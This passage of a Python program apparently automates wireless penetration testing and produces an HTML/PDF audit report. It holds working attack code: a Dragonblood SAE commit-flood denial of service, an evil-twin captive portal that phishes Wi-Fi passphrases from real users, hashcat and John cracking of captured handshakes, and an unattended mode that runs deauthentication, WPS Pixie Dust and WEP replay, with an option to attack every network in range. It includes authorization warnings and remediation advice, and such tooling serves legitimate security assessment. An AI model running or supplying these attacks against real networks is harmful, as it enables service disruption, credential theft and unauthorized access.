    warn("Dragonblood PoCs are RESEARCH-GRADE and can DoS the SAE handshake / AP.")
    warn("They are a SEPARATE AUTHORIZATION — only run where explicitly in scope.")
    if not confirm("Proceed with Dragonblood SAE testing?"):
        return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel), ap.enc_kind,
                       "Dragonblood SAE testing (skipped)", "Info", "Not tested",
                       "Operator declined the Dragonblood module at runtime.")
    base = wd / "dragonblood"
    dragondrain = shutil.which("dragondrain") or \
        str(base / "dragondrain-and-time" / "dragondrain" / "dragondrain")
    if not os.path.exists(dragondrain):
        info("Dragonblood tools not built on this host.")
        if have("git") and confirm("Clone vanhoefm/dragondrain-and-time now (build is manual)?"):
            base.mkdir(parents=True, exist_ok=True)
            sh(["git", "clone", "https://github.com/vanhoefm/dragondrain-and-time",
                str(base / "dragondrain-and-time")], timeout=120)
            warn("Cloned. Build needs `make` + libpcap/openssl headers — see the repo README.")
        return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel), ap.enc_kind,
                       "WPA3 Dragonblood readiness", "Info", "Manual review",
                       "Dragonblood tooling is not built here. WPA3-SAE should still be reviewed "
                       "for known Dragonblood-class timing/side-channel/downgrade issues "
                       "(CVE-2019-9494…9499) by AP/client firmware version.",
                       recommendation="Patch firmware to post-Dragonblood versions; prefer "
                       "WPA3-only (no transition) and Hash-to-Element (H2E) SAE.")
    warn("Running dragondrain SAE-commit flood (DoS) for 15s...")
    log = wd / f"dragonblood_{ap.bssid.replace(':','')}.txt"
    log.write_text(f"dragondrain against {ap.bssid} on {mon}\n", encoding="utf-8")
    sh_live(["timeout", "15", dragondrain, "-d", mon, "-a", ap.bssid], timeout=25)
    return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel), ap.enc_kind,
                   "WPA3 SAE Dragonblood (DoS/timing) test", "Medium", "Tested",
                   "SAE was exercised with Dragonblood tooling to gauge susceptibility to "
                   "commit-flood DoS and timing side-channels.",
                   evidence=[str(log)],
                   recommendation="Patch firmware; enable SAE anti-clogging tokens and "
                   "Hash-to-Element (H2E); rate-limit SAE commit frames.")

# ---- OPT-IN module: captive-portal evil-twin PSK phishing (wifiphisher) -----
def attack_captive(ap: AP, mon: str, wd: Path) -> Finding | None:
    if not have("wifiphisher"):
        warn("wifiphisher missing — install: sudo apt install wifiphisher"); return None
    warn("Captive-portal evil-twin stands up a ROGUE AP impersonating this SSID and serves")
    warn("a phishing page to capture the PSK from real users. This is SOCIAL ENGINEERING —")
    warn("highly intrusive, affects live users, and needs EXPLICIT written RoE.")
    warn("Best with TWO adapters (one to deauth clients off the real AP, one to host the twin).")
    if not confirm("Launch the captive-portal evil-twin now?"):
        return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel), ap.enc_kind,
                       "Captive-portal PSK phishing (skipped)", "Info", "Not tested",
                       "Operator declined the captive-portal module at runtime.")
    info(f"Launching wifiphisher for '{ap.essid}' (firmware-upgrade scenario) — Ctrl-C to stop.")
    log = wd / f"captive_{ap.bssid.replace(':','')}.txt"
    log.write_text(f"wifiphisher evil-twin for ESSID '{ap.essid}'\n", encoding="utf-8")
    sh_live(["wifiphisher", "-e", ap.essid, "-p", "firmware-upgrade"])
    return Finding(ap.essid, ap.bssid, ap.channel, band_of(ap.channel), ap.enc_kind,
                   "Captive-portal PSK phishing test", "High", "Tested",
                   "A rogue AP with a captive-portal phishing page was presented for the SSID. "
                   "Any PSK a user submits demonstrates susceptibility to evil-twin credential "
                   "phishing — a people/process weakness independent of passphrase strength.",
                   evidence=[str(log)],
                   recommendation="User-awareness training; deploy WPA3-SAE + 802.11w (PMF) so "
                   "clients are harder to silently deauth; for sensitive networks use 802.1X with "
                   "enforced server-certificate validation instead of a shared PSK.")


ATTACK_FUNCS = {
    "pmkid": attack_pmkid, "handshake": attack_handshake,
    "wps_pixie": lambda ap, m, w: attack_wps(ap, m, w, "pixie"),
    "wps_brute": lambda ap, m, w: attack_wps(ap, m, w, "brute"),
    "wpa3_trans": attack_wpa3_trans, "enterprise": attack_enterprise,
    "wep": attack_wep, "open": attack_open, "dos": attack_dos,
    "post_assoc": attack_post_assoc, "dragonblood": attack_dragonblood,
    "captive": attack_captive,
}


# ---------------------------------------------------------------------------
# Cracking (hashcat -> John fallback)
# ---------------------------------------------------------------------------
def crack_hash(hashfile: Path, wordlist: str, mode: str = "22000") -> str:
    if not hashfile.exists() or hashfile.stat().st_size == 0:
        warn("No hash to crack."); return ""
    if not os.path.exists(wordlist):
        warn(f"Wordlist not found: {wordlist}"); return ""
    if have("hashcat"):
        rc, dev = sh(["hashcat", "-I"])
        if "Backend Device" in dev or "Type" in dev:
            info(f"Cracking with hashcat -m {mode}...")
            sh_live(["hashcat", "-m", mode, "-a", "0", str(hashfile), wordlist,
                     "--potfile-path", str(hashfile) + ".pot"])
            rc, out = sh(["hashcat", "-m", mode, str(hashfile),
                          "--potfile-path", str(hashfile) + ".pot", "--show"])
            if out.strip():
                pw = out.strip().splitlines()[0].split(":")[-1]
                ok(f"CRACKED: {pw}"); return pw
            warn("hashcat exhausted wordlist — not cracked."); return ""
    if have("john"):
        warn("No hashcat GPU device — falling back to John the Ripper.")
        sh_live(["john", f"--wordlist={wordlist}", str(hashfile)])
        rc, out = sh(["john", "--show", str(hashfile)])
        if out and "0 password" not in out:
            ok("Cracked (John) — see 'john --show'."); return out.strip().splitlines()[0]
    warn("No cracking engine available or not cracked.")
    return ""


# ---------------------------------------------------------------------------
# Report generation
# ---------------------------------------------------------------------------
SEV_ORDER = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}
SEV_COLOR = {"Critical": "#7d1128", "High": "#c0392b", "Medium": "#e67e22",
             "Low": "#27ae60", "Info": "#7f8c8d"}

def build_report(findings: list[Finding], meta: dict, out_html: Path) -> Path:
    findings = sorted(findings, key=lambda f: (SEV_ORDER.get(f.severity, 9), f.ssid))
    counts = {s: sum(1 for f in findings if f.severity == s) for s in SEV_ORDER}

    def sev_badge(s):
        return f'<span class="badge" style="background:{SEV_COLOR[s]}">{s}</span>'

    cards = []
    for i, f in enumerate(findings, 1):
        ev = "".join(f"<li><code>{escape(e)}</code></li>" for e in f.evidence) or "<li>—</li>"
        secret = (f'<tr><td>Recovered value</td><td><code>[REDACTED — {len(f.secret)} chars, '
                  f'stored in evidence]</code></td></tr>') if f.secret else ""
        cards.append(f"""
        <div class="card">
          <div class="card-h">
            <span class="fid">F-{i:02d}</span> {sev_badge(f.severity)}
            <span class="title">{escape(f.title)}</span>
          </div>
          <table class="meta">
            <tr><td>Target SSID</td><td>{escape(f.ssid)}</td></tr>
            <tr><td>BSSID</td><td><code>{escape(f.bssid)}</code></td></tr>
            <tr><td>Channel / Band</td><td>{escape(f.channel)} / {escape(f.band)}</td></tr>
            <tr><td>Encryption</td><td>{escape(f.encryption)}</td></tr>
            <tr><td>Status</td><td><b>{escape(f.status)}</b></td></tr>
            {secret}
          </table>
          <p class="lbl">Observation</p><p>{escape(f.detail)}</p>
          <p class="lbl">Evidence</p><ul class="ev">{ev}</ul>
          <p class="lbl">Recommendation</p><p>{escape(f.recommendation or '—')}</p>
        </div>""")

    summary_rows = "".join(
        f'<tr><td>{s}</td><td style="text-align:center">'
        f'<span class="badge" style="background:{SEV_COLOR[s]}">{counts[s]}</span></td></tr>'
        for s in SEV_ORDER)

    target_rows = "".join(
        f"<tr><td>{escape(f.ssid)}</td><td><code>{escape(f.bssid)}</code></td>"
        f"<td>{escape(f.encryption)}</td><td>{sev_badge(f.severity)}</td>"
        f"<td>{escape(f.title)}</td></tr>" for f in findings)

    html = f"""<!doctype html><html lang="en"><head><meta charset="utf-8">
<title>WiFi VAPT Report — {escape(meta.get('engagement','Wireless Security Audit'))}</title>
<style>
 :root{{--ink:#1b2733;--mut:#5b6b7a;--line:#dfe6ec;--teal:#0f6e63;}}
 *{{box-sizing:border-box}}
 body{{font-family:'Segoe UI',Arial,sans-serif;color:var(--ink);margin:0;background:#f4f6f8}}
 .wrap{{max-width:960px;margin:0 auto;background:#fff;padding:0 0 60px}}
 header{{background:linear-gradient(135deg,#0f6e63,#13403b);color:#fff;padding:40px 48px}}
 header .kick{{letter-spacing:3px;font-size:11px;opacity:.8;text-transform:uppercase}}
 header h1{{margin:6px 0 4px;font-size:30px}}
 header .sub{{opacity:.9;font-size:14px}}
 .metabar{{display:flex;flex-wrap:wrap;gap:24px;padding:16px 48px;background:#0c332e;color:#cfe;font-size:12px}}
 .metabar div span{{display:block;opacity:.65;font-size:10px;text-transform:uppercase;letter-spacing:1px}}
 section{{padding:26px 48px}}
 h2{{color:var(--teal);border-bottom:2px solid var(--line);padding-bottom:6px;font-size:20px}}
 table{{border-collapse:collapse;width:100%;font-size:13px;margin-top:10px}}
 th,td{{border:1px solid var(--line);padding:8px 10px;text-align:left}}
 th{{background:#eef3f5}}
 .badge{{color:#fff;padding:2px 9px;border-radius:10px;font-size:11px;font-weight:600}}
 .card{{border:1px solid var(--line);border-left:5px solid var(--teal);border-radius:6px;
        padding:16px 20px;margin:16px 0;box-shadow:0 1px 3px rgba(0,0,0,.05)}}
 .card-h{{display:flex;align-items:center;gap:10px;margin-bottom:8px}}
 .card-h .title{{font-weight:700;font-size:16px}}
 .fid{{font:600 12px monospace;color:var(--mut)}}
 .card table.meta td:first-child{{width:150px;color:var(--mut)}}
 .lbl{{margin:12px 0 2px;font-weight:700;color:var(--teal);font-size:12px;text-transform:uppercase;letter-spacing:.5px}}
 .ev code{{font-size:12px}} code{{background:#eef3f5;padding:1px 5px;border-radius:3px}}
 .disc{{font-size:11px;color:var(--mut);padding:20px 48px;border-top:1px solid var(--line)}}
 footer{{text-align:center;font-size:11px;color:var(--mut);padding:20px}}
</style></head><body><div class="wrap">
<header>
  <div class="kick">Penetration Test · Wireless Security Assessment</div>
  <h1>WiFi VAPT Report</h1>
  <div class="sub">{escape(meta.get('engagement','Wireless Security Audit'))}</div>
</header>
<div class="metabar">
  <div><span>Client</span>{escape(meta.get('client','—'))}</div>
  <div><span>Assessor</span>{escape(meta.get('assessor','—'))}</div>
  <div><span>Date</span>{escape(meta.get('date','—'))}</div>
  <div><span>Adapter</span>{escape(meta.get('adapter','—'))}</div>
  <div><span>Classification</span>CONFIDENTIAL</div>
</div>

<section>
  <h2>Executive Summary</h2>
  <p>A wireless security assessment was performed against {len(set(f.ssid for f in findings))}
  in-scope SSID(s). The engagement followed the standard WiFi VAPT methodology —
  reconnaissance, WPA2/WPA3 handshake &amp; PMKID testing, WPS testing, Enterprise
  (802.1X) assessment, and configuration review. A total of
  <b>{len(findings)}</b> findings were recorded, including
  <b>{counts['Critical']} Critical</b> and <b>{counts['High']} High</b> severity issues.</p>
  <table style="max-width:320px">
    <tr><th>Severity</th><th style="text-align:center">Count</th></tr>
    {summary_rows}
  </table>
</section>

<section>
  <h2>Findings at a Glance</h2>
  <table>
    <tr><th>SSID</th><th>BSSID</th><th>Encryption</th><th>Severity</th><th>Finding</th></tr>
    {target_rows or '<tr><td colspan=5>No findings recorded.</td></tr>'}
  </table>
</section>

<section>
  <h2>Detailed Findings</h2>
  {''.join(cards) or '<p>No detailed findings.</p>'}
</section>

<section>
  <h2>Methodology &amp; Scope</h2>
  <p>Testing was conducted from Kali Linux using an external monitor-mode adapter,
  per the WiFi VAPT &amp; Wireless Security Audit runbook. Phases executed:
  Pre-flight adapter setup, Reconnaissance (airodump-ng / wash), WPA2-Personal
  (PMKID &amp; handshake), WPS (Pixie Dust / PIN), WPA3 &amp; transition-mode review,
  Enterprise 802.1X evil-twin, and configuration analysis. All active techniques
  were performed within the agreed Rules of Engagement.</p>
</section>

<div class="disc"><b>Confidential.</b> This report documents authorized security
testing and is intended solely for the named client. Recovered secrets are redacted
here and retained only in the secured evidence store per the data-handling agreement.
All test artifacts and rogue APs were torn down and the tester's interface restored
at the end of the engagement.</div>
<footer>Generated {escape(meta.get('generated',''))} · WiFi Audit Suite</footer>
</div></body></html>"""
    out_html.write_text(html, encoding="utf-8")
    ok(f"HTML report written: {out_html}")

    # try PDF
    pdf = out_html.with_suffix(".pdf")
    if have("wkhtmltopdf"):
        rc, _ = sh(["wkhtmltopdf", "--enable-local-file-access", str(out_html), str(pdf)])
        if rc == 0 and pdf.exists(): ok(f"PDF report written: {pdf}")
    else:
        try:
            from weasyprint import HTML  # type: ignore
            HTML(str(out_html)).write_pdf(str(pdf)); ok(f"PDF report written: {pdf}")
        except Exception:
            warn("No wkhtmltopdf / weasyprint — HTML only. "
                 "Install one for PDF: sudo apt install wkhtmltopdf")
    return out_html


# ---------------------------------------------------------------------------
# Interactive flow
# ---------------------------------------------------------------------------
BANNER = f"""{C.B}{C.BOLD}
  ╦ ╦┬┌─┐┬  ╔═╗┬ ┬┌┬┐┬┌┬┐  ╔═╗┬ ┬┬┌┬┐┌─┐
  ║║║│├┤ │  ╠═╣│ │ │││ │   ╚═╗│ ││ │ ├┤
  ╚╩╝┴└  ┴  ╩ ╩└─┘─┴┘┴ ┴   ╚═╝└─┘┴ ┴ └─┘{C.X}
  Automated WiFi VAPT orchestrator — {C.Y}AUTHORIZED USE ONLY{C.X}
"""

def _rank(aps: list[AP]) -> list[AP]:
    return sorted(aps, key=lambda a: (a.enc_kind == "OPEN", -_pwr(a)))

def _print_target_table(ranked: list[AP]):
    hr()
    print(f"{'#':>2}  {'SSID':<26}{'ENC':<18}{'CH':>3} {'PWR':>4} {'WPS':<6}{'CLI':>3}  RECOMMENDED")
    hr()
    for i, a in enumerate(ranked, 1):
        rec = recommend(a)
        top = ATTACKS[rec[0][0]][0].split(" (")[0] if rec else "-"
        wps = ("LOCKED" if a.wps_locked else "open") if a.wps else "-"
        print(f"{i:>2}  {a.essid[:26]:<26}{a.enc_kind:<18}{a.channel:>3} "
              f"{a.power:>4} {wps:<6}{len(a.clients):>3}  {C.G}{top}{C.X}")
    hr()

def choose_target(aps: list[AP]) -> AP | None:
    ranked = _rank(aps)
    print()
    _print_target_table(ranked)
    sel = ask("Select target # (blank to finish):")
    if sel.isdigit() and 1 <= int(sel) <= len(ranked):
        return ranked[int(sel) - 1]
    return None

def pick_targets_auto(aps: list[AP]) -> list[AP]:
    """Post-sweep picker for auto mode: choose one target by number, a range/list
    (e.g. 1,3,5 or 2-4), or 'a' for all. Blank cancels."""
    ranked = _rank(aps)
    print()
    info("Networks discovered — choose which to attack:")
    _print_target_table(ranked)
    sel = ask("Target # to attack  ('a' = all,  e.g. 1,3 or 2-4,  blank = cancel):").strip().lower()
    if not sel:
        return []
    if sel in ("a", "all"):
        return ranked
    chosen: list[AP] = []
    for part in sel.replace(" ", "").split(","):
        if "-" in part:
            try:
                lo, hi = (int(x) for x in part.split("-", 1))
            except ValueError:
                continue
            for n in range(lo, hi + 1):
                if 1 <= n <= len(ranked):
                    chosen.append(ranked[n - 1])
        elif part.isdigit() and 1 <= int(part) <= len(ranked):
            chosen.append(ranked[int(part) - 1])
    # de-dup preserving order
    seen, out = set(), []
    for a in chosen:
        if a.bssid not in seen:
            seen.add(a.bssid); out.append(a)
    return out

def _pwr(a: AP) -> int:
    try: return int(a.power)
    except ValueError: return -999

def target_menu(ap: AP, mon: str, wd: Path, findings: list[Finding], wordlist: str):
    while True:
        recs = recommend(ap)
        print()
        info(f"Target: {C.BOLD}{ap.essid}{C.X}  [{ap.enc_kind}]  BSSID {ap.bssid}  ch {ap.channel}")
        print(f"    {C.Y}Recommended attack path (in order):{C.X}")
        opts = []
        for j, (key, why) in enumerate(recs, 1):
            label, applies, tools, disruptive, from_pdf, opt_in = ATTACKS[key]
            avail = all(have(t) for t in tools) if tools else True
            tag = "" if from_pdf else f" {C.M}[GAP-ADD]{C.X}"
            if opt_in:
                tag += f" {C.B}[OPT-IN]{C.X}"
            dis = f" {C.R}(disruptive){C.X}" if disruptive else ""
            miss = "" if avail else f" {C.Y}(tools missing){C.X}"
            print(f"      {j}. {label}{tag}{dis}{miss}\n         └ {why}")
            opts.append(key)
        print(f"      c. Crack a captured hash now (hashcat/John)")
        print(f"      0. Back to target list")
        sel = ask("Choose attack #:")
        if sel == "0" or sel == "":
            return
        if sel.lower() == "c":
            hf = ask("Path to .hc22000 hash file:")
            if hf:
                mode = "5500" if ap.enc_kind == "ENTERPRISE" else "22000"
                crack_hash(Path(hf), wordlist, mode)
            continue
        if sel.isdigit() and 1 <= int(sel) <= len(opts):
            key = opts[int(sel) - 1]
            fn = ATTACK_FUNCS[key]
            try:
                result = fn(ap, mon, wd)
            except Exception as e:
                err(f"Attack '{key}' raised: {e}"); result = None
            if result:
                findings.append(result)
                ok(f"Recorded finding: {result.title} [{result.severity}]")
                # offer immediate crack if we produced a hash
                hashes = [e for e in result.evidence if e.endswith(".hc22000")]
                if hashes and confirm("Attempt to crack the captured hash now?"):
                    pw = crack_hash(Path(hashes[0]), wordlist)
                    if pw:
                        result.secret = pw; result.severity = "Critical"
                        result.status = "Vulnerable — passphrase cracked"
                        result.detail += f" The passphrase was successfully recovered from the wordlist."
        else:
            warn("Invalid selection.")


def _auto_keys(ap: AP, aggressive: bool) -> list[str]:
    """Attacks safe to run unattended for this AP (no prompts). Aggressive adds
    active-but-targeted attacks that still never prompt. Enterprise evil-twin,
    WPS PIN brute, DoS, and all OPT-IN modules are intentionally excluded — they
    require human confirmation and are never auto-run."""
    k = ap.enc_kind
    keys: list[str] = []
    if k in ("WPA2_PSK", "WPA23_TRANSITION"):
        keys.append("pmkid")                       # clientless, non-disruptive
        if k == "WPA23_TRANSITION":
            keys.append("wpa3_trans")              # config detection only
        if aggressive:
            keys.append("handshake")               # targeted deauth
            if ap.wps and not ap.wps_locked:
                keys.append("wps_pixie")           # Pixie Dust (no PIN brute)
    elif k == "WPA3":
        keys.append("wpa3_trans")                  # config detection only
    elif k == "OPEN":
        keys.append("open")                        # documentation only
    elif k == "WEP" and aggressive:
        keys.append("wep")                         # ARP replay
    return keys

def run_auto(mon: str, aps: list[AP], wd: Path, findings: list[Finding],
             wordlist: str, aggressive: bool = False):
    mode = "AGGRESSIVE" if aggressive else "SAFE"
    print()
    info(f"{C.BOLD}AUTO mode ({mode}){C.X} — no prompts; auditing {len(aps)} target(s).")
    if aggressive:
        warn("AGGRESSIVE auto: sends targeted deauth, WPS Pixie Dust, and WEP replay "
             "automatically. Confirm this is within your Rules of Engagement.")
    else:
        info("SAFE auto: clientless PMKID + config checks only (no deauth). "
             "Add --aggressive for handshake/WPS/WEP.")
    for idx, ap in enumerate(aps, 1):
        keys = _auto_keys(ap, aggressive)
        if not keys:
            info(f"[{idx}/{len(aps)}] {ap.essid} [{ap.enc_kind}] — nothing to run "
                 "unattended (Enterprise/locked-WPS/opt-in need confirmation); skipping.")
            continue
        info(f"[{idx}/{len(aps)}] {C.BOLD}{ap.essid}{C.X} [{ap.enc_kind}] ch {ap.channel} "
             f"→ {', '.join(keys)}")
        for key in keys:
            _, _, tools, *_ = ATTACKS[key]
            if tools and not all(have(t) for t in tools):
                warn(f"    skip {key}: missing tool(s)."); continue
            try:
                res = ATTACK_FUNCS[key](ap, mon, wd)
            except Exception as e:
                err(f"    {key} raised: {e}"); res = None
            if not res:
                continue
            findings.append(res)
            ok(f"    finding: {res.title} [{res.severity}]")
            hashes = [e for e in res.evidence if e.endswith(".hc22000")]
            if hashes:
                info("    auto-cracking captured hash...")
                pw = crack_hash(Path(hashes[0]), wordlist)
                if pw:
                    res.secret = pw; res.severity = "Critical"
                    res.status = "Vulnerable — passphrase cracked"
                    res.detail += " The passphrase was recovered from the wordlist."
    ok("AUTO run complete.")


def main():
    ap = argparse.ArgumentParser(description="Automated WiFi VAPT orchestrator (Kali).")
    ap.add_argument("-i", "--iface", help="wireless interface (e.g. wlan1)")
    ap.add_argument("--recon-time", type=int, default=30, help="recon sweep seconds")
    ap.add_argument("--reg", default="", help="regulatory domain (e.g. US, SG)")
    ap.add_argument("--wordlist", default=None,
                    help="wordlist for cracking; if omitted you'll be prompted "
                         "(blank at the prompt = default rockyou.txt)")
    ap.add_argument("-o", "--outdir", default="./audit_run")
    ap.add_argument("--report-only", metavar="JSON", help="rebuild report from findings JSON")
    ap.add_argument("--auto", action="store_true",
                    help="fully automated: no prompts; runs safe/non-disruptive attacks on every "
                         "target + auto-cracks captured hashes, then writes the report")
    ap.add_argument("--aggressive", action="store_true",
                    help="with --auto: ALSO run targeted-deauth handshake capture, WPS Pixie Dust, "
                         "and WEP replay automatically (disruptive — confirm RoE first)")
    ap.add_argument("--client", default="Client", help="client name for the report (--auto)")
    ap.add_argument("--assessor", default="", help="assessor name for the report (--auto)")
    ap.add_argument("--bssid", default="",
                    help="ONLY audit this AP MAC, e.g. AA:BB:CC:DD:EE:FF (scopes the whole run)")
    ap.add_argument("--ssid", default="",
                    help="ONLY audit APs with this exact SSID (case-insensitive). "
                         "Combine with --bssid to pin one radio of a multi-AP SSID.")
    ap.add_argument("--all", action="store_true",
                    help="with --auto and no --bssid/--ssid: attack ALL discovered networks "
                         "without showing the picker (unattended)")
    args = ap.parse_args()

    # --aggressive implies --auto (so you can just run:  wifi_audit.py --aggressive)
    if args.aggressive:
        args.auto = True

    outdir = Path(args.outdir); outdir.mkdir(parents=True, exist_ok=True)

    # report-only mode
    if args.report_only:
        data = json.loads(Path(args.report_only).read_text(encoding="utf-8"))
        finds = [Finding(**f) for f in data["findings"]]
        build_report(finds, data.get("meta", {}), outdir / "wifi_report.html")
        return

    print(BANNER)
    if os.geteuid() != 0:
        err("Run as root: sudo python3 wifi_audit.py"); sys.exit(1)

    inv = inventory()
    missing = [t for t, ok_ in inv.items() if not ok_]
    if missing:
        warn("Missing tools (some attacks unavailable): " + ", ".join(missing))
        info("Install core set: sudo apt install aircrack-ng hcxdumptool hcxtools "
             "reaver bully hashcat john mdk4 kismet")

    # pick interface
    iface = args.iface
    if not iface:
        ifaces = list_wifi_ifaces()
        if not ifaces:
            err("No wireless interfaces found. Plug in / pass through a USB adapter."); sys.exit(1)
        if args.auto:
            mons = [f for f in ifaces if is_monitor(f)]
            if mons:
                iface = mons[0]
            elif len(ifaces) == 1:
                iface = ifaces[0]
            else:
                err("Multiple interfaces present — in --auto mode select one with -i "
                    f"(e.g. -i {ifaces[-1]}). Seen: {', '.join(ifaces)}"); sys.exit(1)
            info(f"[AUTO] Using interface: {iface}")
        else:
            print("\nWireless interfaces:")
            for i, f in enumerate(ifaces, 1):
                print(f"  {i}. {f}{'  (monitor)' if is_monitor(f) else ''}")
            sel = ask("Select interface #:", "1")
            iface = ifaces[int(sel) - 1] if sel.isdigit() and 1 <= int(sel) <= len(ifaces) else ifaces[0]

    mon = start_monitor(iface, args.reg)
    if not mon:
        sys.exit(1)
    injection_test(mon)

    # --- choose the wordlist: prompt for a custom one unless --wordlist was given
    DEFAULT_WL = "/usr/share/wordlists/rockyou.txt"
    if args.wordlist:                       # explicit --wordlist: no prompt
        wl = args.wordlist
    elif args.all:                          # fully unattended (--all): no prompt
        wl = DEFAULT_WL
    else:
        ans = ask("Use a custom wordlist for cracking? "
                  "Enter its full path, or press ENTER for default rockyou.txt:").strip()
        wl = ans or DEFAULT_WL
    # if the chosen path is missing, hunt common locations before giving up
    if not os.path.exists(wl):
        for cand in [wl, DEFAULT_WL,
                     os.path.expanduser("~/Desktop/rockyou.txt"),
                     os.path.expanduser("~/rockyou.txt"),
                     os.path.expanduser("~/wordlists/rockyou.txt"),
                     "./rockyou.txt"]:
            if os.path.exists(cand):
                if cand != wl:
                    warn(f"'{wl}' not found — using {cand}")
                wl = cand
                break
        else:
            warn(f"Wordlist not found: {wl} — cracking will be SKIPPED. "
                 "Pass --wordlist /path or symlink rockyou to the default location.")
    if os.path.exists(wl):
        ok(f"Wordlist: {wl}")
    args.wordlist = wl

    findings: list[Finding] = []
    meta = {
        "engagement": "Wireless Security Audit",
        "client": args.client if args.auto else ask("Client name (for the report):", "Client"),
        "assessor": (args.assessor or os.environ.get("USER", "Tester")) if args.auto
                    else ask("Assessor name:", os.environ.get("USER", "Tester")),
        "adapter": f"{iface} → {mon}",
        "date": datetime.now().strftime("%Y-%m-%d"),
        "generated": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"),
    }

    try:
        aps = recon(mon, args.recon_time, outdir)
        if aps and (args.bssid or args.ssid):
            matched = filter_targets(aps, args.bssid, args.ssid)
            if not matched:
                err(f"No AP matched your target filter (bssid='{args.bssid or '-'}', "
                    f"ssid='{args.ssid or '-'}'). NOTHING was attacked.")
                info("SSIDs seen this sweep: "
                     + ", ".join(sorted({a.essid for a in aps})[:25]))
                info("Copy the exact SSID/BSSID from the list above, or widen --recon-time.")
                aps = []
            else:
                ok(f"Target locked: {len(matched)} AP(s) matched — the other "
                   f"{len(aps) - len(matched)} network(s) will be left untouched.")
                for a in matched:
                    info(f"    → {a.essid}  {a.bssid}  ch {a.channel}  [{a.enc_kind}]")
                aps = matched
        elif aps and args.auto and not args.all:
            # no --bssid/--ssid given: let the operator pick from the swept list
            aps = pick_targets_auto(aps)
            if aps:
                ok(f"Selected {len(aps)} target(s): "
                   + ", ".join(f"{a.essid}[{a.enc_kind}]" for a in aps))
            else:
                info("No target selected — nothing will be attacked.")
        if not aps:
            warn("No target(s) to audit.")
        elif args.auto:
            run_auto(mon, aps, outdir, findings, args.wordlist, args.aggressive)
        else:
            while aps:
                target = choose_target(aps)
                if not target:
                    break
                target_menu(target, mon, outdir, findings, args.wordlist)
                if not confirm("Audit another target?"):
                    break
    except KeyboardInterrupt:
        warn("\nInterrupted by operator.")
    finally:
        # persist findings + build report
        payload = {"meta": meta, "findings": [asdict(f) for f in findings]}
        (outdir / "findings.json").write_text(json.dumps(payload, indent=2), encoding="utf-8")
        if findings:
            build_report(findings, meta, outdir / "wifi_report.html")
        else:
            info("No findings recorded — skipping report.")
        stop_monitor(mon)
        ok(f"Done. Artifacts in: {outdir.resolve()}")


if __name__ == "__main__":
    main()
